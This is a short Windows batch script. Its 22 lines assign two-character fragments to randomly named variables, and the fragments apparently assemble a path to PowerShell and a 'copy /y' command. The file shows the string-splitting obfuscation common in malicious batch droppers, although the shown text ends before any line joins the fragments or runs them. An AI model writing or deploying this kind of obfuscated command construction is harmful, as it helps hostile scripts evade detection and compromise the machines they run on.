@echo off
set "IxVsIDmMcL=ll"
set "ozybJtXEXx=0\"
set "HjnJQljSRl=rS"
set "zAvdixNvjO=in"
set "JJCcUTNLOW=xe"
set "qBfUxVKmOl=we"
set "EhXBYbQUMX=he"
set "vRCbZXQckM=Wi"
set "TTwEcNGlNM=he"
set "BgbuchMpsC=y "
set "VckuPfiPKB= C"
set "ogFXSdBDMj=Sy"
set "qZBRSBOihb=py"
set "hYOmGRMlMx= /"
set "ySqfQdXpJk=32"
set "DIKCiRCkYq=:\"
set "VoqClXETZF=ws"
set "bKmMYXSAjp=we"
set "NlbaLYAhcb=do"
set "ODvKzwfBRJ=1."
set "oHEvbNSefD=rs"
set "MaEPmYwmWt=Po"
